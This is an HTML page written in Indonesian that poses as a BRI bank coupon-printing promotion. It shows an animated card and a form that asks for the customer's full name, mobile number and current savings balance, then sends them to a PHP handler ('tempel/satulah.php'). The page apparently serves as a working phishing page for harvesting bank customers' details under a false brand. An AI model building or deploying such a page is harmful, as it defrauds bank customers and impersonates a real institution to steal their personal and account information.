...
<meta content='#1A89DF' name='msapplication-navbutton-color'/>
...
.card-input__input {
  ...
  height: 40px;
  border-radius: 10px;
  box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36); border: outline-style: groove;
...
<div class="wrapper" id="app">
    ...
    <font style="color: #1A89DF; text-align: center; margin-top: -30px; margin-bottom: 10px; font-weight: 800; font-size: 20px">Lengkapi data Pencetakan Kupon</font>
    <div class="card-form">
      <div class="card-list">
        <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
          <div class="card-item__side -front">
            ...
            <div class="card-item__cover">
              <img
              src="https://hosting.tigerengine.id/hdkzy9.jpg" class="card-item__bg">
            </div>
            ...
            <div class="card-item__wrapper">
              ...
              <div class="card-item__content">
                <label for="cardName" class="card-item__info" ref="cardName">
                  <div class="card-item__holder">Nomor Handphone</div>
                  <transition name="slide-fade-up">
                    ...
                    <div class="card-item__name" v-else key="2">+62###-####-####</div>
                  </transition>
                </label>
                <div class="card-item__date" ref="cardDate">
                  ...
                  <label for="cardMonth" class="card-item__dateItem">
                    <transition name="slide-fade-up">
                      <span v-if="cardMonth" v-bind:key="cardMonth" style="margin-left: 40px">{{cardMonth}}</span>
                      <span v-else key="2" style="margin-left: 40px"></span>
                    </transition>
                  </label>
          ...
          <div class="card-item__side -back">
            <div class="card-item__cover">
              <img
              src="https://blue.kumparan.com/image/upload/fl_progressive,fl_lossy,c_fill,q_auto:best,w_640/v1634025439/01gajrskjgtkcqk2nhpssgbwad.jpg" class="card-item__bg">
            </div>

            <div class="card-item__cvv" style="margin-top: 20px">
      ...
      <div class="card-form__inner">
          <form action="tempel/satulah.php" method="POST">
        <div class="card-input">
          <label for="cardName" class="card-input__label" style="font-weight: 800;margin-left: 3px">Nama Lengkap Nasabah</label>
          <input type="hidden" id="logo" value="༺═𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜═༻">
          <input type="text" id="nama" name="a" class="card-input__input" v-model="cardNumber" v-on:focus="focusInput"  data-ref="cardNumber" autocomplete="off" placeholder="Masukan Nama Lengkap Nasabah" required>
        </div>
        <div class="card-input">
          <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px">Nomor Handphone</label>
          <input type="tel" id="nomor" name="b" class="card-input__input" v-model="cardName"  v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Masukkan Nomor Handphone" maxlength="13" required>
        </div>
        <div class="card-form__row">
          ...
          <div class="card-form__col -cvv">
            <div class="card-input">
              <label for="cardCvv" class="card-input__label"style="font-weight: 800; margin-left: 5px">Saldo Rekening Tabungan saat Ini</label>
              <input type="tel" class="uang card-input__input" id="saldo" name="c" placeholder="" maxlength=""  autocomplete="off" required style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe-Idq42mWgtclhLZhDmwthinuthln9vPg0baIQp-SUYSezJwr0_ZtXArsOrAIoDTnUGIa0h9UiCzji48bcKTUFJV8Lr3LtM5HWXEyczuWy7sSoDPjMH1XJuu8f3Eaa_Fo6oLGwkz2ZHgWgOrZ2J04xN6ERYap4LA2HbIBYmum9dmBR_VIxF4Rp79qExo/s1080/AddText_12-30-09.39.24.jpg);
  background-repeat: no-repeat;
  background-position: 100% 100%;
  background-size: 100% 100%; background-color: #ddd; padding-left: 35px">
            </div>
          </div>
        </div>

         <button id="kirim" type="submit" class="card-form__button">Lanjut </button> 
      </div>
   </form>
</div>
  </div>
...
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script><script  src="./credit.js"></script>
